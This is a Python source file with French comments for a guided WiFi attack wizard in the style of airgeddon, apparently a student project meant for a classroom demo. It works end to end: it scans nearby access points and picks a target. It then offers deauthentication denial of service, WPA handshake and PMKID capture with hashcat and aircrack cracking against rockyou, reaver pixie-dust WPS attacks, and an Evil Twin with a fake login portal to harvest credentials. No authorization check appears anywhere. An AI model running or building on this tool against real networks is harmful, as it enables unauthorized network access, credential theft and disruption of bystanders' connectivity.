"""WiFi Wizard — flow guidé style airgeddon mais plus simple + plus pédagogique.

Au lieu de te faire taper toi-même tous les paramètres (BSSID, channel, etc.)
le wizard scanne, te présente une LISTE, tu choisis un numéro, il fait le reste.
"""

import os
import re
import csv
import time
import glob
import subprocess
from core import ui, runner


# ─────────────────────────────────────────────────────────────────────────────
# Session — garde l'état entre les étapes
# ─────────────────────────────────────────────────────────────────────────────

class Session:
    def __init__(self):
        self.iface = None       # interface d'origine (wlan0, wlx7820...)
        self.mon_iface = None    # interface monitor (wlan0mon ou même nom)
        self.bssid = None
        self.essid = None
        self.channel = None
        self.encryption = None
        self.privacy = None      # WPA / WPA2 / WPA3 / OPN
        self.cipher = None
        self.power = None
        self.clients = []        # MAC des clients de cette AP
        self.pmf = None          # True/False/None
        self.capture_dir = "/tmp/kt-wifi"

    def reset_target(self):
        self.bssid = self.essid = self.channel = None
        self.encryption = self.privacy = self.cipher = None
        self.clients = []
        self.pmf = None

S = Session()


# ─────────────────────────────────────────────────────────────────────────────
# Étape 1 : sélectionner l'interface
# ─────────────────────────────────────────────────────────────────────────────

def list_wifi_ifaces():
    """Retourne les interfaces WiFi (managed ou monitor)."""
    try:
        out = subprocess.check_output(["iw", "dev"], text=True)
    except Exception:
        return []
    ifaces = []
    current = None
    for line in out.splitlines():
        m = re.match(r'\s*Interface\s+(\S+)', line)
        if m:
            current = {"name": m.group(1), "type": "?"}
            ifaces.append(current)
        elif current and "type" in line:
            current["type"] = line.split()[-1]
    return ifaces


def pick_iface():
    ui.header("ÉTAPE 1 — Sélection de l'interface WiFi")
    ifaces = list_wifi_ifaces()
    if not ifaces:
        ui.err("aucune interface WiFi détectée. Branche ton adaptateur USB ?")
        return False
    print("Interfaces détectées :\n")
    for i, it in enumerate(ifaces, 1):
        tag = "monitor" if it["type"] == "monitor" else "managed"
        color = ui.G if tag == "monitor" else ui.Y
        print(f"  {ui.C}{i}{ui.RESET}. {it['name']:<25} [{color}{tag}{ui.RESET}]")
    print()
    if len(ifaces) == 1:
        ui.info(f"Une seule interface → sélection auto : {ifaces[0]['name']}")
        S.iface = ifaces[0]["name"]
    else:
        try:
            n = int(ui.ask("numéro de l'interface", default="1"))
            S.iface = ifaces[n-1]["name"]
        except (ValueError, IndexError):
            ui.err("choix invalide"); return False

    # déjà en monitor ?
    if any(it["name"] == S.iface and it["type"] == "monitor" for it in ifaces):
        S.mon_iface = S.iface
        ui.ok(f"interface {S.iface} déjà en mode monitor")
        return True
    return True


# ─────────────────────────────────────────────────────────────────────────────
# Étape 2 : activer le monitor
# ─────────────────────────────────────────────────────────────────────────────

def enable_monitor():
    if S.mon_iface:
        return True
    ui.header("ÉTAPE 2 — Activation du mode monitor")
    ui.info("Mise en monitor mode (utilise iw, plus fiable que airmon-ng sur driver mainline)")

    cmds = [
        ["ip", "link", "set", S.iface, "down"],
        ["iw", "dev", S.iface, "set", "type", "monitor"],
        ["ip", "link", "set", S.iface, "up"],
    ]
    for c in cmds:
        runner.run(c, tag="wiz-mon", root=True, stream=False)

    # vérifie
    out = subprocess.run(["iw", "dev", S.iface, "info"], capture_output=True, text=True)
    if "type monitor" in out.stdout:
        S.mon_iface = S.iface
        ui.ok(f"{S.iface} → mode monitor ✓")
        return True

    ui.warn("iw a échoué, tentative airmon-ng…")
    runner.run(["airmon-ng", "check", "kill"], tag="wiz-kill", root=True, stream=False)
    runner.run(["airmon-ng", "start", S.iface], tag="wiz-airmon", root=True, stream=False)
    cand = S.iface + "mon"
    out = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    if cand in out.stdout:
        S.mon_iface = cand; ui.ok(f"monitor actif : {cand}"); return True
    if S.iface in out.stdout:
        S.mon_iface = S.iface; ui.ok(f"monitor actif : {S.iface}"); return True
    ui.err("impossible de passer en monitor"); return False


def disable_monitor():
    if not S.mon_iface:
        return
    ui.info("Restauration mode managed + NetworkManager…")
    runner.run(["ip", "link", "set", S.mon_iface, "down"], tag="wiz-end", root=True, stream=False)
    runner.run(["iw", "dev", S.mon_iface, "set", "type", "managed"], tag="wiz-end", root=True, stream=False)
    runner.run(["ip", "link", "set", S.mon_iface, "up"], tag="wiz-end", root=True, stream=False)
    runner.run(["systemctl", "restart", "NetworkManager"], tag="wiz-end", root=True, stream=False)
    S.mon_iface = None


# ─────────────────────────────────────────────────────────────────────────────
# Étape 3 : scan + parsing CSV airodump
# ─────────────────────────────────────────────────────────────────────────────

def scan_aps(duration=20):
    ui.header(f"ÉTAPE 3 — Scan des APs ({duration}s)")
    ui.info("airodump-ng tourne en silence, parse du CSV à la fin.\n")

    os.makedirs(S.capture_dir, exist_ok=True)
    prefix = os.path.join(S.capture_dir, "scan")
    for f in glob.glob(prefix + "*"):
        try: os.remove(f)
        except: pass

    # background scan
    cmd = ["airodump-ng", "-w", prefix, "--output-format", "csv", S.mon_iface]
    full = ["sudo"] + cmd
    p = subprocess.Popen(full, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ui.info("scan en cours…")
    for i in range(duration):
        time.sleep(1)
        print(f"  {ui.D}{i+1}/{duration}s{ui.RESET}", end="\r")
    print()
    p.terminate()
    try: p.wait(timeout=3)
    except: p.kill()

    return parse_airodump_csv(prefix + "-01.csv")


def parse_airodump_csv(path):
    """Parse le CSV airodump → liste APs (dict) + map BSSID→[clients]."""
    if not os.path.exists(path):
        return [], {}
    with open(path, errors="ignore") as f:
        content = f.read()

    parts = content.split("\r\n\r\n") if "\r\n\r\n" in content else content.split("\n\n")
    aps = []
    clients_map = {}

    if len(parts) >= 1:
        ap_section = parts[0]
        lines = ap_section.splitlines()
        for line in lines[2:]:  # skip header
            cols = [c.strip() for c in line.split(",")]
            if len(cols) < 14 or not cols[0]: continue
            bssid = cols[0]
            if not re.match(r'[0-9A-F:]{17}', bssid): continue
            aps.append({
                "bssid": bssid,
                "channel": cols[3],
                "speed": cols[4],
                "privacy": cols[5],
                "cipher": cols[6],
                "auth": cols[7],
                "power": cols[8],
                "essid": cols[13] if len(cols) > 13 else "",
            })

    if len(parts) >= 2:
        cli_section = parts[1]
        for line in cli_section.splitlines()[2:]:
            cols = [c.strip() for c in line.split(",")]
            if len(cols) < 6: continue
            mac = cols[0]; ap_bssid = cols[5]
            if not re.match(r'[0-9A-F:]{17}', mac): continue
            clients_map.setdefault(ap_bssid, []).append(mac)

    return aps, clients_map


# ─────────────────────────────────────────────────────────────────────────────
# Étape 4 : sélection cible
# ─────────────────────────────────────────────────────────────────────────────

def pick_target():
    aps, clients_map = scan_aps(duration=20)
    if not aps:
        ui.err("aucun AP trouvé. Vérifie l'antenne / réessaie."); return False

    ui.header(f"ÉTAPE 4 — Sélection de la cible ({len(aps)} APs détectés)")
    # tri par puissance
    try:
        aps.sort(key=lambda a: int(a["power"]) if a["power"] not in ("", "-1") else -100, reverse=True)
    except: pass

    print(f"\n{ui.D}  #   BSSID              CH  PWR  ENC      CLIENTS  ESSID{ui.RESET}")
    print(f"{ui.D}  ─── ────────────────── ─── ───── ──────── ──────── ────────────────────{ui.RESET}")
    for i, ap in enumerate(aps, 1):
        cli_count = len(clients_map.get(ap["bssid"], []))
        cli_str = f"  {ui.G}{cli_count}{ui.RESET}" if cli_count > 0 else f"  {ui.D}0{ui.RESET}"
        enc = (ap["privacy"] + " " + ap["cipher"]).strip() or "?"
        pwr = ap["power"]
        # highlight Bbox
        essid_color = ui.Y if ap["essid"].lower().startswith("bbox") else ""
        essid = f"{essid_color}{ap['essid'][:30]}{ui.RESET if essid_color else ''}"
        print(f"  {ui.C}{i:>3}{ui.RESET} {ap['bssid']}  {ap['channel']:>2}  {pwr:>4}  {enc:<8}    {cli_str}     {essid}")

    print()
    try:
        n = int(ui.ask("numéro de la cible (0 pour annuler)"))
        if n == 0: return False
        ap = aps[n-1]
    except (ValueError, IndexError):
        ui.err("choix invalide"); return False

    S.bssid = ap["bssid"]
    S.essid = ap["essid"]
    S.channel = ap["channel"]
    S.encryption = ap["privacy"]
    S.cipher = ap["cipher"]
    S.power = ap["power"]
    S.clients = clients_map.get(S.bssid, [])

    ui.ok(f"Cible : {S.essid} ({S.bssid}) ch.{S.channel} {S.encryption} — {len(S.clients)} clients")
    return True


# ─────────────────────────────────────────────────────────────────────────────
# Étape 5 : test PMF (rapide, 1 deauth pour voir si client réagit)
# ─────────────────────────────────────────────────────────────────────────────

def test_pmf():
    ui.info("Test PMF rapide : 1 deauth broadcast pour voir si l'AP/clients réagissent…")
    runner.run(
        ["iw", "dev", S.mon_iface, "set", "channel", S.channel],
        tag="wiz-chan", root=True, stream=False
    )
    # heuristique : si encryption contient WPA3 ou SAE → PMF obligatoire
    if "WPA3" in S.encryption or "SAE" in (S.cipher or ""):
        S.pmf = True
        ui.warn("Encryption = WPA3/SAE → PMF obligatoire, deauth bloqué")
    else:
        ui.info(f"Encryption {S.encryption} → PMF possible mais non garanti")
        S.pmf = None


# ─────────────────────────────────────────────────────────────────────────────
# Étape 6 : menu d'actions sur la cible
# ─────────────────────────────────────────────────────────────────────────────

def action_handshake():
    ui.header(f"Capture handshake — {S.essid}")
    prefix = os.path.join(S.capture_dir, "hs")
    runner.run(["iw", "dev", S.mon_iface, "set", "channel", S.channel],
               tag="wiz-chan", root=True, stream=False)

    ui.info("Lancement airodump pour 60s. Pendant ce temps, on enverra 5 deauth.")
    ui.warn("Si PMF activé, le deauth sera ignoré → préfère PMKID")
    if not ui.confirm("Continuer ?"): return

    # Lance airodump en bg
    p = subprocess.Popen(
        ["sudo", "airodump-ng", "-c", S.channel, "--bssid", S.bssid,
         "-w", prefix, S.mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)
    # deauth en parallèle si on a un client
    if S.clients:
        target_client = S.clients[0]
        runner.run(["aireplay-ng", "-0", "5", "-a", S.bssid, "-c", target_client, S.mon_iface],
                   tag="wiz-deauth", root=True, stream=False)
    else:
        runner.run(["aireplay-ng", "-0", "5", "-a", S.bssid, S.mon_iface],
                   tag="wiz-deauth-bc", root=True, stream=False)

    ui.info("Attente 60s pour qu'un client se reconnecte…")
    time.sleep(60)
    p.terminate()
    try: p.wait(timeout=3)
    except: p.kill()

    # check si handshake capturé
    cap = prefix + "-01.cap"
    if os.path.exists(cap):
        out = subprocess.run(["aircrack-ng", cap], capture_output=True, text=True, timeout=10)
        if "1 handshake" in out.stdout or "WPA (" in out.stdout:
            ui.ok(f"Handshake capturé : {cap}")
            ui.info(f"Crack : aircrack-ng -w /usr/share/wordlists/rockyou.txt {cap}")
        else:
            ui.warn("Aucun handshake détecté. PMF probable, essaie PMKID.")
    ui.pause()


def action_pmkid():
    ui.header(f"Capture PMKID — {S.essid}")
    if not runner.check_tools(["hcxdumptool", "hcxpcapngtool"]):
        ui.pause(); return
    out_file = os.path.join(S.capture_dir, "pmkid.pcapng")
    if os.path.exists(out_file): os.remove(out_file)

    ui.info("Capture 90s — silencieux, marche sur PMF si AP renvoie PMKID")
    runner.run(["timeout", "90", "hcxdumptool", "-i", S.mon_iface, "-w", out_file,
                "--enable_status=1"], tag="wiz-pmkid", root=True)

    # convert
    hash_file = os.path.join(S.capture_dir, "hash.hc22000")
    runner.run(["hcxpcapngtool", "-o", hash_file, out_file],
               tag="wiz-convert", root=True, stream=False)

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        ui.ok(f"Hash extrait : {hash_file}")
        if ui.confirm("Tenter crack avec rockyou ?"):
            wl = "/usr/share/wordlists/rockyou.txt"
            if os.path.exists(wl):
                runner.run(["hashcat", "-m", "22000", hash_file, wl], tag="wiz-hashcat")
            else:
                ui.warn(f"{wl} absent — sudo gunzip {wl}.gz")
    else:
        ui.warn("Pas de PMKID — l'AP ne le renvoie pas (rare). Tente handshake.")
    ui.pause()


def action_deauth():
    ui.header(f"Deauth — {S.essid}")
    if S.pmf is None: test_pmf()
    if S.pmf:
        ui.warn("PMF actif → deauth classique inutile. Va dans 'WiFi avancé' pour CSA/EAPOL.")
        if not ui.confirm("Lancer quand même (parfois force le firmware à bugger) ?"): return
    runner.run(["iw", "dev", S.mon_iface, "set", "channel", S.channel],
               tag="wiz-chan", root=True, stream=False)
    count = ui.ask("nb paquets (0=infini)", default="20")
    if S.clients:
        ui.info(f"Cible client : {S.clients[0]}")
        runner.run(["aireplay-ng", "-0", count, "-a", S.bssid, "-c", S.clients[0], S.mon_iface],
                   tag="wiz-deauth", root=True)
    else:
        runner.run(["aireplay-ng", "-0", count, "-a", S.bssid, S.mon_iface],
                   tag="wiz-deauth-bc", root=True)
    ui.pause()


def action_evil_twin():
    ui.header(f"Evil Twin → {S.essid}")
    ui.info("Lancement du module Evil Twin avec la cible déjà configurée.")
    from modules import evil_twin
    evil_twin.launch_with_target(
        target_ssid=S.essid, target_bssid=S.bssid,
        target_channel=S.channel, mon_iface=S.mon_iface
    )


def action_wps_check():
    ui.header("Détection WPS sur la cible")
    if not runner.check_tools(["wash"]): ui.pause(); return
    runner.run(["timeout", "15", "wash", "-i", S.mon_iface, "-c", S.channel],
               tag="wiz-wash", root=True)
    if ui.confirm("Lancer reaver pixie dust ?"):
        runner.run(["reaver", "-i", S.mon_iface, "-b", S.bssid, "-c", S.channel, "-K", "1", "-vv"],
                   tag="wiz-reaver", root=True)
    ui.pause()


def target_menu():
    while True:
        actions = [
            {"label": "Capturer handshake WPA", "fn": action_handshake, "status": "cfg",
             "info": "Capture le 4-way handshake via airodump + deauth. Bloqué si PMF actif."},
            {"label": "Capturer PMKID (anti-PMF compatible)", "fn": action_pmkid, "status": "ok",
             "info": "Capture silencieuse, fonctionne sur PMF si AP renvoie un PMKID."},
            {"label": "Deauth (DoS)", "fn": action_deauth, "status": "cfg",
             "info": "Force la déconnexion des clients. PMF bloque sur clients récents."},
            {"label": "Evil Twin + portail captif", "fn": action_evil_twin, "status": "ok",
             "info": "Clone l'AP cible, lance un faux portail de login pour capturer credentials."},
            {"label": "Détecter WPS + tenter pixie dust", "fn": action_wps_check, "status": "old",
             "info": "Vérifie si WPS activé. Si oui, tente la cassure pixie en quelques sec."},
            {"label": "Re-sélectionner une autre cible", "fn": lambda: pick_target() and target_menu(), "status": "tool",
             "info": "Refait un scan."},
        ]
        title = f"ACTIONS pour {S.essid} ({S.bssid})"
        idx = ui.menu(title, actions)
        if idx is None: return
        actions[idx]["fn"]()


# ─────────────────────────────────────────────────────────────────────────────
# Entrée principale
# ─────────────────────────────────────────────────────────────────────────────

def wizard_start():
    """Flow complet airgeddon-style."""
    ui.banner()
    print(f"\n{ui.M}{ui.BOLD}═══ WiFi WIZARD — flow guidé ═══{ui.RESET}\n")
    print("Le wizard va automatiquement :")
    print("  1. Détecter ton/tes adapter(s) WiFi")
    print("  2. Activer le mode monitor")
    print("  3. Scanner les APs alentour")
    print("  4. Te montrer la liste pour choisir une cible")
    print("  5. Proposer les attaques applicables à cette cible\n")
    if not ui.confirm("Démarrer ?"): return

    if not pick_iface(): ui.pause(); return
    if not enable_monitor(): ui.pause(); return
    if not pick_target(): cleanup(); return

    target_menu()
    cleanup()


def cleanup():
    ui.header("Nettoyage")
    if ui.confirm("Désactiver le mode monitor et restaurer NetworkManager ?"):
        disable_monitor()
    ui.ok("Wizard terminé. Logs dans ~/.kt-logs/")


def evil_twin_only():
    """Lance directement le module evil twin."""
    from modules import evil_twin
    evil_twin.standalone()


ITEMS = [
    {
        "label": "WIZARD complet (scan → cible → action)", "fn": wizard_start, "status": "ok",
        "info": """Flow guidé style airgeddon, en 6 étapes auto :

  1. Détection des interfaces WiFi
  2. Activation du monitor mode
  3. Scan des APs (20s, parsing automatique du CSV)
  4. Liste triée par puissance (Bbox highlight en jaune)
  5. Tu choisis un numéro → cible enregistrée
  6. Menu d'actions applicables à la cible :
       • Handshake WPA
       • PMKID (compatible PMF)
       • Deauth (auto-détecte si PMF actif et te le dit)
       • Evil Twin + portail captif
       • WPS pixie dust check
  7. Cleanup auto (restauration WiFi normal)

PARFAIT POUR : démo aux profs, pas besoin de retenir les BSSID/channels."""
    },
    {
        "label": "Evil Twin direct (sans scan préalable)", "fn": evil_twin_only, "status": "ok",
        "info": """Lance le module Evil Twin sans passer par le wizard.
Pour si tu connais déjà ton SSID/BSSID cible."""
    },
]


def menu():
    while True:
        idx = ui.menu("WiFi WIZARD (style airgeddon)", ITEMS)
        if idx is None: return
        ITEMS[idx]["fn"]()
